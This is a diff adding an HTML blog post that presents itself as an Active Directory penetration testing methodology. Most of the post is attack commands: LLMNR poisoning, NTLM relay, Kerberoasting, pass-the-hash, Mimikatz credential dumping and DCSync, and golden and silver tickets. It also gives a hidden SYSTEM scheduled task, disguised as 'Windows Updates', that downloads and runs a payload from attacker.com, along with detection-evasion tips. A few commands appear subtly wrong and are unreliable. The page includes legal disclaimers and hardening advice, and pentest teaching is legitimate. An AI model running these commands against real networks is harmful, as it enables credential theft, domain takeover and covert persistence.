@@ -1,1 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Penetration Testing: Complete Methodology & Exploitation Techniques</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+        }
 
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 6px 14px;
+            background: var(--danger);
+            color: white;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">RED TEAM</span>
+                <h1 class="post-title">Active Directory Penetration Testing: Complete Methodology & Exploitation Techniques</h1>
+                <div class="post-meta">
+                    <span>Published: Dec 2025</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>Active Directory (AD) is the backbone of most enterprise networks, managing authentication, authorization, and access control for millions of users worldwide. However, its complexity and default misconfigurations make it an attractive target for attackers. This comprehensive guide covers the complete methodology, tools, and techniques for conducting professional Active Directory penetration tests.</p>
+
+                <h2>Understanding Active Directory Architecture</h2>
+                <p>Active Directory is a hierarchical, distributed directory service that stores information about network resources and user accounts. Before conducting a penetration test, you must understand the core components:</p>
+
+                <ul>
+                    <li><strong>Domain Controllers (DCs):</strong> Servers running AD, handling authentication and replication</li>
+                    <li><strong>Domains:</strong> Logical groupings of users, computers, and resources</li>
+                    <li><strong>Forests:</strong> Collections of domains sharing the same schema and trust relationships</li>
+                    <li><strong>Organizational Units (OUs):</strong> Containers for organizing users, computers, and groups</li>
+                    <li><strong>Group Policy Objects (GPOs):</strong> Rules and configurations applied to users and computers</li>
+                    <li><strong>Kerberos:</strong> The primary authentication protocol used by AD</li>
+                </ul>
+
+                <h2>AD Penetration Testing Methodology</h2>
+                <p>Professional AD penetration testing follows a structured approach with distinct phases:</p>
+
+                <h3>Phase 1: Reconnaissance & Information Gathering</h3>
+                <p>The initial phase focuses on gathering intelligence about the target environment without accessing systems:</p>
+
+                <pre><code># Network Scanning with Nmap
+nmap -sV -p 88,389,636,3268,3269 -Pn target-subnet/24
+
+# Domain Information Collection
+nslookup -type=SRV _kerberos._tcp.dc._msdcs.domain.com
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
+
+# OSINT with theHarvester
+theHarvester -d domain.com -l 50 -b google
+
+# Extract user list from LinkedIn, company websites
+# Compile potential AD usernames</code></pre>
+
+                <div class="info-box">
+                    <h4>💡 OSINT Gathering</h4>
+                    <p>Use tools like Sherlock, Hunter.io, and LinkedIn to compile potential username lists. This is essential for credential guessing and ASREPRoasting attacks.</p>
+                </div>
+
+                <h3>Phase 2: Initial Access & Credential Acquisition</h3>
+                <p>This phase aims to obtain valid AD credentials to start lateral movement and privilege escalation:</p>
+
+                <h4>LLMNR/NBT-NS Poisoning</h4>
+                <p>One of the quickest wins in AD penetration testing is exploiting LLMNR (Link-Local Multicast Name Resolution) and NBT-NS poisoning:</p>
+
+                <pre><code># Using Responder to poison LLMNR and NBT-NS
+sudo responder -I eth0 -rdwv
+
+# In the output, capture NTLMv2 hashes
+# Example: user::domain:timestamp:NTLM-hash
+
+# Crack captured hashes with Hashcat
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <h4>SMB Relay Attack</h4>
+                <pre><code># Set up SMB relay to relay credentials instead of cracking
+sudo ntlmrelayx.py -t smb://192.168.1.100 -c 'whoami'
+
+# Or relay to dump SAM hashes
+sudo ntlmrelayx.py -t smb://192.168.1.100 -c 'cmd.exe /c net user'</code></pre>
+
+                <h4>Kerbrute - Username Enumeration</h4>
+                <pre><code># Enumerate valid AD users without authentication
+kerbrute userenum -d domain.com --dc 192.168.1.10 userlist.txt
+
+# Output shows valid users that can be targeted for ASREPRoasting
+# Valid users are marked in the output</code></pre>
+
+                <h4>ASREPRoasting</h4>
+                <pre><code># Identify users with "Do not require Kerberos preauthentication" enabled
+# Using GetNPUsers.py from Impacket
+python3 GetNPUsers.py -dc-ip 192.168.1.10 -usersfile users.txt domain.com/
+
+# Crack the captured AS-REP hashes
+hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <div class="warning-box">
+                    <h4>⚠️ Credential Acquisition Note</h4>
+                    <p>Always ensure you have written authorization before attempting to capture or crack credentials. These techniques should only be used in authorized penetration testing engagements.</p>
+                </div>
+
+                <h2>Advanced Enumeration Techniques</h2>
+                <p>Once you have initial access or valid credentials, comprehensive enumeration reveals attack paths:</p>
+
+                <h3>LDAP Enumeration</h3>
+                <pre><code># Basic LDAP query for domain information
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" \
+  -s sub "(objectClass=user)" sAMAccountName
+
+# Get all users
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" \
+  -s sub "(objectClass=user)" | grep sAMAccountName
+
+# Enumerate groups with administrative privileges
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" \
+  "(&(objectClass=group)(member=*))" cn member</code></pre>
+
+                <h3>ldapdomaindump - Automated LDAP Extraction</h3>
+                <pre><code># Dump all AD information via LDAP
+ldapdomaindump -u domain.com\\username -p password 192.168.1.10
+
+# Output includes: users, groups, computers, trusts, policies
+# Great for getting comprehensive AD overview</code></pre>
+
+                <h3>PowerView - PowerShell Enumeration</h3>
+                <pre><code># Load PowerView
+. .\PowerView.ps1
+
+# Get all users
+Get-NetUser
+
+# Find users with admin privileges
+Get-NetUser | Where-Object { $_.memberof -like "*Admin*" } | Select-Object samaccountname
+
+# Get all computers
+Get-NetComputer
+
+# Enumerate shares on all computers
+Find-NetShare
+
+# Get group policies
+Get-NetGPO
+
+# Check for delegation (Kerberos delegation)
+Get-NetUser -TrustedToAuth | Select-Object samaccountname</code></pre>
+
+                <h3>BloodHound - AD Relationship Mapping</h3>
+                <pre><code># Collect data using SharpHound (Windows)
+.\SharpHound.exe -c All
+
+# Or using BloodHound.py (Linux)
+bloodhound-python -d domain.com -u username -p password \
+  -gc dc.domain.com -c All
+
+# Load JSON files into BloodHound GUI
+# Analyze attack paths visually
+# Find shortest paths to domain admin</code></pre>
+
+                <h2>Kerberos-Based Attacks</h2>
+                <p>Kerberos is AD's authentication protocol. Several attacks target its weaknesses:</p>
+
+                <h3>Kerberoasting</h3>
+                <p>Extract and crack TGS (Ticket Granting Service) hashes from service accounts:</p>
+
+                <pre><code># Using impacket's GetUserSPNs.py
+python3 GetUserSPNs.py -request domain.com/username:password
+
+# Output: Kerberos hashes for service accounts
+# Crack with hashcat
+hashcat -m 13100 kerberos-hashes.txt /usr/share/wordlists/rockyou.txt
+
+# PowerShell alternative
+Invoke-Kerberoast | Export-Csv -Path kerberoast.csv -NoTypeInformation</code></pre>
+
+                <h3>Delegation Attacks (Constrained & Unconstrained)</h3>
+                <pre><code># Check for unconstrained delegation
+Get-NetUser -TrustedToAuth
+
+# Check for constrained delegation
+Get-NetUser -AllowDelegation
+
+# Exploit unconstrained delegation with Rubeus
+.\Rubeus.exe triage  # List available tickets
+.\Rubeus.exe dump /service:krbtgt
+
+# Exploit constrained delegation with impacket
+python3 getST.py -spn host/target.domain.com \
+  domain.com/delegated-account:password</code></pre>
+
+                <h2>Lateral Movement Techniques</h2>
+                <p>After obtaining credentials, move horizontally through the network:</p>
+
+                <h3>Pass-the-Hash (PTH)</h3>
+                <pre><code># Using impacket's psexec.py with NTLM hash
+psexec.py DOMAIN/username@target.com -hashes \
+  aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+
+# Using CrackMapExec
+crackmapexec smb 192.168.1.0/24 -u username \
+  -H e19ccf75ee54e06b06a5907af13cef42 -x 'whoami'</code></pre>
+
+                <h3>Pass-the-Ticket (PTT)</h3>
+                <pre><code># Extract ticket
+python3 GetUserSPNs.py -request domain.com/username:password
+
+# Inject ticket into memory
+python3 ticketer.py -nthash hash -identity username@domain.com \
+  -spn host/target domain.com/Administrator
+
+# Use injected ticket
+export KRB5CCNAME=/path/to/ticket.ccache</code></pre>
+
+                <h3>Evil-WinRM - Remote PowerShell Access</h3>
+                <pre><code># Access with password
+evil-winrm -i 192.168.1.100 -u domain\\username -p password
+
+# Access with NTLM hash
+evil-winrm -i 192.168.1.100 -u domain\\username \
+  -H e19ccf75ee54e06b06a5907af13cef42</code></pre>
+
+                <h3>CrackMapExec - Swiss Army Knife</h3>
+                <pre><code># Enumerate SMB shares
+crackmapexec smb 192.168.1.0/24 -u username -p password --shares
+
+# Execute remote commands
+crackmapexec smb 192.168.1.100 -u username -p password -x 'systeminfo'
+
+# Dump SAM hashes (with admin privilege)
+crackmapexec smb 192.168.1.100 -u username -p password --sam
+
+# Dump credentials from registry
+crackmapexec smb 192.168.1.100 -u username -p password --lusrmgr</code></pre>
+
+                <h2>Privilege Escalation in AD</h2>
+                <p>Escalate from low-privilege user to Domain Admin:</p>
+
+                <h3>Mimikatz - Credential Dumping</h3>
+                <pre><code># Dump all cached credentials
+mimikatz# sekurlsa::logonpasswords
+
+# Extract domain cached credentials
+mimikatz# lsadump::cache
+
+# Extract NTDS.dit from domain controller
+mimikatz# lsadump::dcsync /user:domain\\Administrator</code></pre>
+
+                <h3>PowerUpSQL - SQL Server Vulnerabilities</h3>
+                <pre><code># Find SQL servers
+Get-SQLInstanceLocal
+
+# Check for SQL authentication
+Get-SQLServerInfo -Instance "ServerName\Instance" \
+  -Username sa -Password password123
+
+# Escalate via SQL
+Invoke-SQLOSCmd -Instance "ServerName\Instance" \
+  -Username sa -Password password123 -Command "whoami"</code></pre>
+
+                <h3>Weak Group Policy Permissions</h3>
+                <pre><code># Find writable group policies
+Get-NetGPO | ForEach-Object {
+  $_ | Get-ObjectAcl -ResolveGUIDs | 
+  Where-Object {$_.ActiveDirectoryRights -like "*Write*"}
+}</code></pre>
+
+                <h2>Post-Exploitation & Persistence</h2>
+                <p>Maintain access and demonstrate impact:</p>
+
+                <h3>Golden Ticket</h3>
+                <pre><code># Create golden ticket using krbtgt hash
+mimikatz# kerberos::golden /user:Administrator /domain:domain.com \
+  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
+  /krbtgt:hash /ticket:golden.kirbi
+
+# Inject ticket
+mimikatz# kerberos::ptt golden.kirbi</code></pre>
+
+                <h3>Silver Ticket</h3>
+                <pre><code># Create silver ticket for specific service
+mimikatz# kerberos::golden /user:Administrator /domain:domain.com \
+  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
+  /target:TARGET.domain.com /service:cifs /rc4:hash \
+  /ticket:silver.kirbi</code></pre>
+
+                <h3>Scheduled Task for Persistence</h3>
+                <pre><code># Create hidden scheduled task
+schtasks /create /tn "Windows Updates" /tr "powershell.exe -nop -w hidden \
+  -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')\\\"" \
+  /sc daily /st 12:00 /ru SYSTEM /f /rl highest</code></pre>
+
+                <h2>Essential Tools for AD Penetration Testing</h2>
+                <p>Here's a comprehensive toolkit for professional AD assessments:</p>
+
+                <h3>Linux-Based Tools</h3>
+                <ul>
+                    <li><strong>Nmap:</strong> Network discovery and port scanning</li>
+                    <li><strong>Responder:</strong> LLMNR/NBT-NS poisoning</li>
+                    <li><strong>Impacket Suite:</strong> Kerberos and SMB toolkit (GetUserSPNs, psexec, secretsdump)</li>
+                    <li><strong>CrackMapExec:</strong> SMB enumeration and exploitation</li>
+                    <li><strong>ldapdomaindump:</strong> LDAP extraction and analysis</li>
+                    <li><strong>BloodHound.py:</strong> AD relationship mapping</li>
+                    <li><strong>Kerbrute:</strong> User enumeration and brute forcing</li>
+                    <li><strong>ntlmrelayx.py:</strong> SMB relay attacks</li>
+                    <li><strong>Hashcat:</strong> GPU-accelerated hash cracking</li>
+                    <li><strong>Evil-WinRM:</strong> Remote PowerShell access</li>
+                </ul>
+
+                <h3>Windows-Based Tools</h3>
+                <ul>
+                    <li><strong>PowerView:</strong> PowerShell AD enumeration</li>
+                    <li><strong>Mimikatz:</strong> Credential dumping and Kerberos attacks</li>
+                    <li><strong>Rubeus:</strong> Kerberos manipulation</li>
+                    <li><strong>BloodHound/SharpHound:</strong> AD relationship visualization</li>
+                    <li><strong>PingCastle:</strong> AD security assessment reporting</li>
+                    <li><strong>PowerUpSQL:</strong> SQL Server enumeration and exploitation</li>
+                    <li><strong>ADRecon:</strong> AD enumeration and reporting</li>
+                    <li><strong>Sherlock:</strong> Privilege escalation vulnerability scanner</li>
+                    <li><strong>Inveigh:</strong> LLMNR/mDNS poisoning (Windows version of Responder)</li>
+                </ul>
+
+                <h2>Detection Evasion Tips</h2>
+                <p>Professional penetration testers should understand detection mechanisms:</p>
+
+                <ul>
+                    <li><strong>Living-off-the-land:</strong> Use built-in Windows tools (PowerShell, WMIC, net.exe)</li>
+                    <li><strong>Process Injection:</strong> Avoid suspicious child process creation</li>
+                    <li><strong>Timing:</strong> Space out enumeration to avoid triggering alerts</li>
+                    <li><strong>Avoid Mimikatz:</strong> Use alternatives like secretsdump or lsassy</li>
+                    <li><strong>Disable Logging:</strong> Be aware of PowerShell script block logging</li>
+                    <li><strong>Clean Artifacts:</strong> Remove tools and scripts after exploitation</li>
+                </ul>
+
+                <div class="danger-box">
+                    <h4>⚠️ Legal & Ethical Requirements</h4>
+                    <p>Active Directory penetration testing must ONLY be conducted with explicit written authorization from the organization. Unauthorized access to computer systems is illegal under laws like the Computer Fraud and Abuse Act (CFAA). Always ensure you have proper scope, authorization letters, and clear rules of engagement before beginning any assessment.</p>
+                </div>
+
+                <h2>AD Hardening Recommendations</h2>
+                <p>As penetration testers, recommending mitigations is critical:</p>
+
+                <ul>
+                    <li>Require Kerberos preauthentication for all users (disable ASREPRoasting)</li>
+                    <li>Disable LLMNR and disable NetBIOS over TCP/IP</li>
+                    <li>Implement account lockout policies to prevent brute force</li>
+                    <li>Use strong, unique passwords for service accounts</li>
+                    <li>Regularly audit AD permissions and group memberships</li>
+                    <li>Implement tiered administrative access (PAM/PAW solutions)</li>
+                    <li>Monitor Event IDs 4768, 4769, 4770, 4771 for Kerberos attacks</li>
+                    <li>Disable unconstrained delegation unless absolutely necessary</li>
+                    <li>Use LAPS for local administrator password management</li>
+                    <li>Implement Network Segmentation and Zero Trust principles</li>
+                    <li>Regular security training for users on phishing and social engineering</li>
+                    <li>Conduct regular AD security assessments</li>
+                </ul>
+
+                <h2>Conclusion</h2>
+                <p>Active Directory penetration testing is a complex but essential skill for modern cybersecurity professionals. The techniques, tools, and methodologies outlined in this guide provide a comprehensive framework for conducting professional assessments. Remember that each environment is unique, and adaptability is key.</p>
+
+                <p>The goal of AD penetration testing is not just to demonstrate vulnerabilities, but to help organizations strengthen their security posture. By understanding attacker techniques and implementing proper defenses, organizations can significantly reduce their risk of compromise.</p>
+
+                <p>Stay ethical, obtain proper authorization, and continuously update your skills as AD and attack techniques evolve. The security landscape is constantly changing, and staying ahead of threats requires continuous learning and practice.</p>
+            </div>
+        </article>
+
+        <footer>
+            <p>© 2025 CyberSec Research Lab. All research for educational purposes only.</p>
+        </footer>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const html = document.documentElement;
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            const currentTheme = html.getAttribute('data-theme');
+            
+            if (currentTheme === 'light') {
+                html.removeAttribute('data-theme');
+                themeIcon.textContent = '☀️';
+                themeText.textContent = 'Light Mode';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                html.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme');
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            
+            if (savedTheme === 'light') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+            }
+        });
+    </script>
+</body>
+</html>
